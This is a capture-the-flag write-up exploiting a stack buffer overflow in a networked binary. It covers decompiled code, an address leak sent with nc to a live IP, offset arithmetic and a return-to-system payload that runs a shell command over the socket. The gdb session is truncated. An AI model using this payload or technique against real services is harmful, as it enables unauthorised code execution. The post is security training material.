Background
----------
The goal was to retrieve the flag stored on the server

Tools used
----------
* IDA Pro
* `gdb`

Process
-------
Opening up the executable in IDA, I found that the function `handle` handled network connections, which I entered and got hexrays to decompile to:
````c
int __cdecl handle(int fd)
{
  int buf; // [sp+10h] [bp-18h]@1
  int v3; // [sp+14h] [bp-14h]@1
  int v4; // [sp+18h] [bp-10h]@1
  int v5; // [sp+1Ch] [bp-Ch]@1

  buf = 0;
  v3 = 0;
  v4 = 0;
  v5 = 0;
  sendstr(fd, "Enter your name: ");
  my_recv(fd, &buf);
  sendstr(fd, "Hello ");
  sendstr(fd, &buf);
  sendstr(fd, "!\n");
  return 0;
}
````

`my_recv` looked likely to be exploitable for this simple code, so I looked inside that:
````c
ssize_t __cdecl my_recv(int fd, void *buf)
{
  ssize_t result; // eax@3

  while ( 1 )
  {
    result = recv(fd, buf, 1u, 0);
    if ( result <= 0 )
      break;
    result = *(_BYTE *)buf;
    if ( (_BYTE)result == 10 )
      break;
    buf = (char *)buf + 1;
  }
  return result;
}
````

Wonderful, this function keeps on reading in input until it encounters a newline or EOF, obviously having a buffer overflow vulnerability.

Because DEP was turned on, I needed to find a vulnerable function to use, and conveniently, function `sistem` at address offset +0x963 contained this:
````c
int __cdecl sistem(const char *command)
{
  return system(command);
}
````

Because ASLR was turned on and this executable was relocatable, I needed to find both the stack address to use to pass a string to `sistem` and the executable base address to call `sistem`. I looked to the function `handle`'s stack:
````
-00000018 buf             db 24 dup(?)
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
````
From this, I now knew to put exactly 24 characters as input to completely fill `buf` and taking out it's terminating `NULL`, revealing both an address of the stack, the `ebp` save `s`; and of the exectuable, the return address `r`.
````
$ printf 'aaaaaaaaaaaaaaaaaaaaaaaa' | nc 54.252.230.126 2345 | hexdump -C
00000000  45 6e 74 65 72 20 79 6f  75 72 20 6e 61 6d 65 3a  |Enter your name:|
00000010  20 48 65 6c 6c 6f 20 61  61 61 61 61 61 61 61 61  | Hello aaaaaaaaa|
00000020  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 f8  |aaaaaaaaaaaaaaa.|
00000030  bb e1 bf d3 9c 7f b7 04  21 0a                    |........!.|
````
This shows that the stack was located around 0xbfe1bbf8 and the executable was located around 0xb77f9cd3

I know that `handle` returns to `main` at offset +0xcd3, so calculating the difference in offsets told me that `sistem` was located at 0xb77f9963 on the server.

To find the stack address I required, which was the address four bytes following the address containing the return address so I could pass a string to `sistem`, I needed to do some live debugging to find out the difference between the stack address I aquired and the address I needed. This following `gdb` session sums it up:
````
$ gdb ./pie

0xffffd0f4:	0x0000002f	0xffffd14c
````
The stack address I would have been shown was 0xffffd148 while the stack address I needed was 0xffffd0e4. This gives a difference between the two of -0x64.

Now I have the required information, I prepare my input:
````
aaaaaaaaaaaaaaaaaaaaaaaaaaaa ; 28 bytes of padding to the return address
\x63\x99\x7f\xb7 ; Address of function sistem at 0xb77f9963
aaaa ; Padding for fake sistem return address
\x98\xbb\xe1\xbf ; Address of following byte as the string to pass (0xbfe1bbf8 - 0x64 + 4) = 0xbfe1bb98
ls >&4\x00 ; Command to run with terminating NULL. File descriptor 4 is always the one corresponding to the network socket.
